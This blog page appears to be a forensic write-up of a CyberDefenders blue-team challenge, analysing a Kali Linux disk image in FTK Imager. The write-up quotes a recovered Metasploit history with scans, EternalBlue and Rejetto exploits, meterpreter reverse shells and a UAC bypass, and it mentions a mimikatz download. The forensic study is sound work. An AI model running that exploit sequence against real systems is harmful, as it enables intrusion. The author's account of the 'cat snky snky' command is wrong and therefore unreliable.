@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Insider Disk Analysis With FTK ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="CyberDefenders Insider - https://cyberdefenders.org/blueteam-ctf-challenges/64
+This challenge centers around using FTKImager to analyze a Linux disk image.
+ What distribution of Linux is being used on this machine? What is the MD5 hash of the apache access.log? It is believed that a credential dumping tool was downloaded? What is the file name of the download? There was a super-secret file created. What is the absolute path? What program used didyouthinkwedmakeiteasy.jpg during execution?"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/writeups/insider/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Insider Disk Analysis With FTK"/>
+<meta name="twitter:description" content="Using FTK disk analysis tool to analyze a Linux disk image."/>
+
+
+
+<meta property="og:title" content="Insider Disk Analysis With FTK" />
+<meta property="og:description" content="Using FTK disk analysis tool to analyze a Linux disk image." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/writeups/insider/" /><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Insider Disk Analysis With FTK</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 7 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="https://i.imgur.com/mUJJzdK.png" alt="Insider Disk Analysis With FTK"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+      <p>CyberDefenders Insider - <a href="https://cyberdefenders.org/blueteam-ctf-challenges/64">https://cyberdefenders.org/blueteam-ctf-challenges/64</a></p>
+<p>This challenge centers around using <a href="https://accessdata.com/product-download/ftk-imager-version-4-5">FTKImager</a> to analyze a Linux disk image.</p>
+<ol>
+<li>What distribution of Linux is being used on this machine?</li>
+<li>What is the MD5 hash of the apache access.log?</li>
+<li>It is believed that a credential dumping tool was downloaded? What is the file name of the download?</li>
+<li>There was a super-secret file created. What is the absolute path?</li>
+<li>What program used didyouthinkwedmakeiteasy.jpg during execution?</li>
+<li>What is the third goal from the checklist Karen created?</li>
+<li>How many times was apache run?</li>
+<li>It is believed this machine was used to attack another. What file proves this?</li>
+<li>Within the Documents file path, it is believed that Karen was taunting a fellow computer expert through a bash script. Who was Karen taunting?</li>
+<li>A user su&rsquo;d to root at 11:26 multiple times. Who was it?</li>
+<li>Based on the bash history, what is the current working directory?</li>
+</ol>
+<p>Let&rsquo;s begin analyzing our disk image!</p>
+<p>To open it up with FTK Imager:</p>
+<ul>
+<li>File &gt; Add evidence item &gt; Image file &gt; Select the disk image &gt; Finish</li>
+</ul>
+<p>Now if we expand our evidence tree, we&rsquo;ll come across 3 folders within the <code>root</code> directory:</p>
+<p><img src="https://i.imgur.com/QtAm8oF.png" alt=""></p>
+<ul>
+<li><code>boot</code></li>
+<li><code>root</code></li>
+<li><code>var</code></li>
+</ul>
+<p>If we select the <code>boot</code> folder, it becomes apparent what distribution of Linux this image is of:</p>
+<p><img src="https://i.imgur.com/iUY8L8s.png" alt=""></p>
+<p>We can safely assume that <strong>Kali Linux</strong> or <strong>Kali</strong> is the Linux distribution being used!</p>
+<p>Recall that there were some questions regarding <code>apache</code> log files which are usually stored in the <code>/var/log/apache2</code> directory, so let&rsquo;s transition to the <code>/var/log/apache2</code> directory!</p>
+<p>We&rsquo;ll find 3 files here:</p>
+<p><img src="https://i.imgur.com/SLYkeaS.png" alt=""></p>
+<ul>
+<li><code>other_vhosts_access.log</code></li>
+<li><code>error.log</code></li>
+<li><code>access.log</code></li>
+</ul>
+<p>But notice the <em>Size</em> column for each of these files, it is 0 meaning the files are empty. We can confirm this by displaying the contents of each file (The bottom right pane displays the contents of the file):</p>
+<p><img src="https://i.imgur.com/0zWBot6.png" alt=""></p>
+<p><img src="https://i.imgur.com/yEp6Q2d.png" alt=""></p>
+<p><img src="https://i.imgur.com/vPfXzlu.png" alt=""></p>
+<p>Now we know that the contents of each file are indeed empty. Since there is no data within the Apache log files, we can safely assume that <strong>apache was ran 0 times</strong>.</p>
+<p>Let&rsquo;s retrieve the hash of the apache <code>access.log</code> file!</p>
+<p>Right-click the <code>access.log</code> file &gt; <em>Export File Hash List</em> &gt; Give the CSV file a name &amp; save it anywhere you&rsquo;d like.</p>
+<p>Now when we open the file, we&rsquo;ll see both the MD5 &amp; SHA1 hash along with the filename:</p>
+<p><img src="https://i.imgur.com/LkjlI5m.png" alt=""></p>
+<p>So the MD5 hash of the <code>access.log</code> file is: <strong>d41d8cd98f00b204e9800998ecf8427e</strong></p>
+<p>Time to begin searching through the <code>root</code> folder which contains many subdirectories along with many files:</p>
+<p><img src="https://i.imgur.com/fTNCItS.png" alt=""></p>
+<p>One file which stood out to me within the <code>root</code> folder was a JPEG image named <code>irZLAohL.jpeg</code>:</p>
+<p><img src="https://i.imgur.com/RWRvH2P.png" alt=""></p>
+<p>We can export this file by right-clicking it &gt; Export Files &gt; Choose a directory to export the file to:</p>
+<p><img src="https://i.imgur.com/KTMe11W.png" alt=""></p>
+<p>This image contains a flag, which isn&rsquo;t relevant to this challenge, but the image appears to be of someone&rsquo;s desktop. Perhaps the attacker took this screenshot when they compromised a victim&rsquo;s machine.</p>
+<p>One of the questions asks for the name of a file which proves that the machine we are analyzing was used to attack another machine, this image could be evidence of that. To add onto that, there is a hidden directory called <code>.ms4</code> within the <code>root</code> directory, this is a directory for metasploit and there&rsquo;s a <code>history</code> file within that hidden directory:</p>
+<p><img src="https://i.imgur.com/0QX387B.png" alt=""></p>
+<p>The full contents of the <code>history</code> file are:</p>
+<pre tabindex="0"><code>hosts
+exit
+hosts
+exit
+db_nmap -sV -O -T5 -Pn 10.0.0.101
+db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX ~/nmap_out.xml
+db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX /root/nmap_out.xml
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set RHOST 10.0.0.101
+run
+show payloads
+use windows/x64/shell/reverse_tcp
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+show payloads
+set payload windows/x64/meterpreter/reverse_tcp
+options
+run
+workspace
+workspace -a Bob
+workspace Bob 
+workspace 
+db_nmap -sS -T4 10.0.0.101
+db_nmap -sV -T4 10.0.0.101
+show services
+show service
+services
+workspace Bob 
+search rejetto
+info rejetto
+use exploit/windows/http/rejetto_hfs_exec 
+info
+hosts
+set RhOST 10.0.0.101
+show infor
+show info
+run
+sessions
+sessions
+sessions
+sessions 1
+search psexec
+search psexec platform:windows
+sessions 1
+use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac_fodhelper 
+options
+set SESSION 1
+options
+run
+sessions
+options
+set target Windows x64
+options
+run
+sessions 1
+db_nmap -sS -T4 10.0.0.101
+db_nmap -sV -T4 10.0.0.101
+exit
+workspace Bob 
+hosts
+search rejetto
+use exploit/windows/http/rejetto_hfs_exec 
+show info
+hosts
+set RhOST 10.0.0.101
+</code></pre><p>I believe that this file is another piece of evidence that this machine was used to attack another machine, though the CTF challenge prefers the image file, <code>irZLAohL.jpeg</code>, as the answer.</p>
+<p>One of the task questions is regarding the bash history file, this is a file that usually resides in <code>/home/&lt;username&gt;/.bash_history</code> so let&rsquo;s dive into that:</p>
+<pre tabindex="0"><code>msfconsole
+systemctl status postgresql
+systemctl enable postgresql
+systemctl start postgresql
+msfconsole
+msfdb init
+msfconsole
+shutdown now
+touch snky snky &gt; /root/Desktop/SuperSecretFile.txt
+cat snky snky &gt; /root/Desktop/SuperSecretFile.txt 
+msfconsole 
+clear
+history
+clear
+history
+whoami
+hack
+do hack
+do hack please
+i am a hacker
+how to hack
+pwd
+ls
+ls -la
+touch delete-me.txt
+rm delete-me.txt 
+ls
+cd Documents/
+mkdir myfirsthack
+cd myfirsthack/
+touch hellworld.sh
+vim hellworld.sh 
+chmod +x hellworld.sh 
+./hellworld.sh 
+touch firstscript
+vim firstscript 
+chmod +x firstscript 
+./firstscript 
+vim firstscript 
+cp firstscript firstscript_fixed
+ls
+vim firstscript
+vim firstscript_fixed 
+./firstscript_fixed 
+flag&lt;this is a flag&gt;
+ifconfig
+cd ..
+cd..
+cd ..
+cd /var/log/
+ls
+cd ..
+cd ~
+ls
+pwf
+pwd
+top
+wall -h
+wall yolo
+ls
+pwd
+cd ..
+ls
+cd home/
+ls
+cd /root
+ls
+cd ../root
+cd ../root/Documents/myfirsthack/../../Desktop/
+sl
+ls
+cd ../Documents/myfirsthack/
+netstat
+echo bob.txt
+touch bob.txt 
+echo &quot;If you're still reading this file, scream cake.&quot;
+echo &quot;Seriously, we'll give you a hint to answer question if you scream cake.&quot;
+sudo visudo
+ls
+sudo ifng
+ifconfi
+apt get moo
+sudo apt get moo
+sudo apt install moo
+sudo apt-install moo
+sudo apt-get install moo
+lol Castro just failed at all these commands. Someone pat him on the back. 
+I tried okay
+history &gt; history.txt
+binwalk didyouthinkwedmakeiteasy.jpg 
+clear
+history
+exit
+touch keys.txt
+pwd
+</code></pre><p>The task question asks what the current working directory is, so the key is to focus on the <code>cd</code> or change directory commands. The last <code>cd</code> command is <code>cd ../Documents/myfirsthack</code> so we can assume that the current directory is <code>/root/Documents/myfirsthack</code></p>
+<p>If we look further at the bash history, we&rsquo;ll see that the user executed <code>binwalk didyouthinkwedmakeiteasy.jpg</code> and there&rsquo;s a task question which asks what program used <code>didyouthinkwedmakeiteasy.jpg</code> as an argument during execution, so the answer is <code>binwalk</code>!</p>
+<p>Question #4 also states that a &ldquo;super-secret&rdquo; file was created &amp; asks for the absolute/full path of the file. Examining the bash history, we find this command:</p>
+<p><code>cat snky snky &gt; /root/Desktop/SuperSecretFile.txt</code></p>
+<p>This command would simply create the <code>SuperSecretFile.txt</code> with empty contents. In order to actually output the words &ldquo;snky snky&rdquo; into the file, quotes would have to surround the words within the command, so the appropriate syntax would be:</p>
+<p><code>cat &quot;snky snky&quot; &gt; /root/Desktop/SuperSecretFile.txt</code></p>
+<p>But anyways, the &ldquo;super-secret&rdquo; file is: <code>/root/Desktop/SuperSecretFile.txt</code>!</p>
+<p>Now the <code>myfirsthack</code> directory was of particular interest to me, mainly out of curiosity! The contents of it consist of bash scripts, a text file, and a fake JPG file:</p>
+<p><img src="https://i.imgur.com/H98w7Oo.png" alt=""></p>
+<p>The reason I say fake JPG is because it&rsquo;s actually a text file which contains a modified version of the <code>.bash_history</code> file that we examined earlier:</p>
+<p><img src="https://i.imgur.com/whb4691.png" alt=""></p>
+<p>The bash scripts are relatively simple:</p>
+<p><img src="https://i.imgur.com/JGlgvHy.png" alt=""></p>
+<p><img src="https://i.imgur.com/PfvVwlL.png" alt=""></p>
+<p><img src="https://i.imgur.com/JT4s6iQ.png" alt=""></p>
+<p>But the second script contains the word <em>Young</em> which is capitalized, possibly indicating that this is the name of an individual.</p>
+<p><img src="https://i.imgur.com/PfvVwlL.png" alt=""></p>
+<p>And one of the questions states that within the Documents path, there&rsquo;s a bash script that taunts a fellow computer expert. Well this is that script, and it&rsquo;s poor <strong>Young</strong> that&rsquo;s being taunted!</p>
+<p>Question #3 states that a credential dumping tool may have been downloaded, and asks the filename for the download. We should first check the <code>/root/Downloads/</code> folder:</p>
+<p><img src="https://i.imgur.com/BcB3WJT.png" alt=""></p>
+<p>MimiKatz was the credential dumping tool downloaded and its filename is <strong>mimikatz_trunk.zip</strong>!</p>
+<p>If we continue searching through the subdirectories of <code>root</code>, we&rsquo;d stumble across the <code>Desktop</code> directory which contains a <code>checklist</code> file:</p>
+<p><img src="https://i.imgur.com/rnRWuUE.png" alt=""></p>
+<p>Now we know that the 3rd goal on Karen&rsquo;s checklist is <strong>profit</strong>!</p>
+<p>Our last question is asking about a user who <code>su</code>&rsquo;d to root at 11:26, we must determine who performed this action. The log file which contains <code>su</code> actions is located at <code>/var/log/auth.log</code>, so back to the <code>/var/log</code> directory we go!</p>
+<p>We don&rsquo;t even need to export the file in order to search through it, we can simply hit <code>CTRL F</code> &amp; search for the time which the user <code>su</code>&rsquo;d:</p>
+<p><img src="https://i.imgur.com/ZiwUNsa.png" alt=""></p>
+<p><img src="https://i.imgur.com/BexqnVh.png" alt=""></p>
+<p>As you can see, these sessions were attempted &amp; opened for the user <code>postgres</code> which is likely the result of the user running <code>systemctl starts postgresql</code> which starts the postgresql service which is a database management system that I believe is used in conjunction with Metasploit!</p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
